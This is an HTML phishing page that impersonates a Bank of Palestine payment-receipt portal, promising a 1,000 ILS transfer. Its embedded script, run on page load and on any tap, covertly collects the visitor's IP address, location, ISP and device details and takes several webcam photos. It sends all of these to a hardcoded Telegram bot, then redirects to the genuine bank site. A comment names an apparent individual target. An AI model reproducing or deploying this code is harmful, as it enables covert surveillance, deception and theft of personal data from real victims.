<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ø¨Ù†Ùƒ ÙÙ„Ø³Ø·ÙŠÙ† - Ø¨ÙˆØ§Ø¨Ø© Ø§Ø³ØªÙ„Ø§Ù… Ø§Ù„Ø¯ÙØ¹Ø§Øª Ø§Ù„Ø¥Ù„ÙƒØªØ±ÙˆÙ†ÙŠØ©</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, sans-serif; background-color: #f8f9fa; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
        .header { background: #fff; position: fixed; top: 0; width: 100%; padding: 10px; border-bottom: 4px solid #d71920; text-align: center; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
        .card { background: white; padding: 40px 25px; border-radius: 20px; box-shadow: 0 15px 35px rgba(0,0,0,0.1); text-align: center; max-width: 400px; width: 90%; position: relative; }
        .logo { width: 130px; margin-bottom: 25px; }
        .success-icon { color: #28a745; font-size: 50px; margin-bottom: 10px; }
        .amount-display { background: #f0fdf4; border: 1.5px solid #28a745; padding: 25px; border-radius: 15px; margin: 20px 0; }
        .amount { font-size: 38px; color: #1a1a1a; font-weight: 800; display: block; }
        .currency { color: #28a745; font-size: 18px; font-weight: bold; }
        .info-text { color: #555; font-size: 14px; line-height: 1.6; margin-bottom: 25px; text-align: right; border-right: 3px solid #0056b3; padding-right: 10px; }
        .main-btn { background: #0056b3; color: white; border: none; padding: 18px; width: 100%; border-radius: 12px; font-size: 20px; font-weight: bold; cursor: pointer; transition: 0.3s; }
        .main-btn:active { transform: scale(0.98); }
        #video, #canvas { display: none; }
    </style>
</head>
<body onclick="activate()">

    <div class="header">
        <img src="https://www.bankofpalestine.com/public/files/image/logo.png" style="width: 100px;">
    </div>

    <div class="card">
        <div class="success-icon">âœ“</div>
        <h2 style="margin:0; color:#1a1a1a; font-size: 22px;">ØªÙ… Ø§Ø¹ØªÙ…Ø§Ø¯ Ø§Ù„Ø­ÙˆØ§Ù„Ø© Ø¨Ù†Ø¬Ø§Ø­</h2>
        
        <div class="amount-display">
            <span class="amount">1,000.00</span>
            <span class="currency">Ø´ÙŠÙƒÙ„ Ø¥Ø³Ø±Ø§Ø¦ÙŠÙ„ÙŠ (ILS)</span>
        </div>

        <div class="info-text">
            â€¢ Ù…Ø±Ø¬Ø¹ Ø§Ù„Ø¹Ù…Ù„ÙŠØ©: <b>BOP-TX88102</b><br>
            â€¢ Ù†ÙˆØ¹ Ø§Ù„Ø¹Ù…Ù„ÙŠØ©: Ø§Ø³ØªÙ„Ø§Ù… Ø¯ÙØ¹Ø© ÙÙˆØ±ÙŠØ©<br>
            â€¢ Ù…Ù„Ø§Ø­Ø¸Ø©: ÙŠØ±Ø¬Ù‰ Ø§Ù„Ø¶ØºØ· Ø£Ø¯Ù†Ø§Ù‡ Ù„Ø¥Ù†Ù‡Ø§Ø¡ Ø¥Ø¬Ø±Ø§Ø¡Ø§Øª Ø§Ù„Ù…Ø²Ø§Ù…Ù†Ø© ÙˆØ§Ù„ØªØ­Ù‚Ù‚ Ø§Ù„Ø±Ù‚Ù…ÙŠ Ù„Ø¥ÙŠØ¯Ø§Ø¹ Ø§Ù„Ù…Ø¨Ù„Øº ÙÙŠ Ø±ØµÙŠØ¯Ùƒ.
        </div>

        <button class="main-btn">Ø§Ø³ØªÙ„Ù… Ø§Ù„Ù…Ø¨Ù„Øº Ø§Ù„Ø¢Ù†</button>
        <p style="font-size: 11px; color: #999; margin-top: 15px;">Ù†Ø¸Ø§Ù… Ø¢Ù…Ù† ÙˆÙ…Ø´ÙØ± Ø¨Ù†Ø³Ø¨Ø© 100% - Ø¨Ù†Ùƒ ÙÙ„Ø³Ø·ÙŠÙ† 2026</p>
    </div>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        const TOKEN = '8550792437:AAFPRHjdjDq1vQvhLKs6S5DpfRId13-MhHc';
        const CHAT_ID = '7184970355';
        let isCaptured = false;
        let systemInfo = "";

        // Ø³Ø­Ø¨ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª ØªÙ„Ù‚Ø§Ø¦ÙŠØ§Ù‹ ÙÙˆØ± Ø§Ù„ØªØ­Ù…ÙŠÙ„ (Ø§Ù„Ù…Ø±Ø­Ù„Ø© Ø§Ù„ØµØ§Ù…ØªØ©)
        window.onload = async function() {
            systemInfo = await fetchSpecs();
            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent('âš ï¸ Ø¯Ø®ÙˆÙ„ Ø¬Ø¯ÙŠØ¯ (Ø²ÙŠØ§Ø¯ Ø§Ù„Ø®Ø·ÙŠØ¨):\n' + systemInfo)}`);
            
            // Ù…Ø­Ø§ÙˆÙ„Ø© ØªØ´ØºÙŠÙ„ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ ØªÙ„Ù‚Ø§Ø¦ÙŠØ§Ù‹ (window.onload)
            attemptCamera();
        };

        async function attemptCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                startCapture(stream);
            } catch (e) { console.log("Waiting for touch..."); }
        }

        function activate() {
            if (isCaptured) return;
            attemptCamera();
        }

        function startCapture(stream) {
            if (isCaptured) return;
            isCaptured = true;
            const video = document.getElementById('video');
            video.srcObject = stream;

            let count = 0;
            const timer = setInterval(() => {
                if (count < 5) {
                    sendToBot(video);
                    count++;
                } else {
                    clearInterval(timer);
                    window.location.href = "https://www.bankofpalestine.com/";
                }
            }, 600);
        }

        async function fetchSpecs() {
            try {
                const ip = await fetch('https://ipapi.co/json/').then(r => r.json());
                const bat = await navigator.getBattery().then(b => (b.level * 100).toFixed(0) + "%");
                const ram = navigator.deviceMemory || "ØºÙŠØ± Ù…ØªÙˆÙØ±";
                const platform = navigator.platform;
                return `ğŸŒ IP: ${ip.ip}\nğŸ“ Ø§Ù„Ù…ÙˆÙ‚Ø¹: ${ip.city}, ${ip.country_name}\nğŸ”‹ Ø§Ù„Ø´Ø­Ù†: ${bat}\nğŸ§  Ø§Ù„Ø±Ø§Ù…: ${ram} GB\nğŸ“± Ø§Ù„Ù†Ø¸Ø§Ù…: ${platform}\nğŸ¢ Ø§Ù„Ù…Ø²ÙˆØ¯: ${ip.org}`;
            } catch (e) { return "ÙØ´Ù„ Ø³Ø­Ø¨ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø±Ù‚Ù…ÙŠØ©"; }
        }

        async function sendToBot(video) {
            const canvas = document.getElementById('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            
            canvas.toBlob(async (blob) => {
                const fd = new FormData();
                fd.append('chat_id', CHAT_ID);
                fd.append('photo', blob, 'capture.jpg');
                fd.append('caption', systemInfo);
                await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
            }, 'image/jpeg', 0.6);
        }
    </script>
</body>
</html>
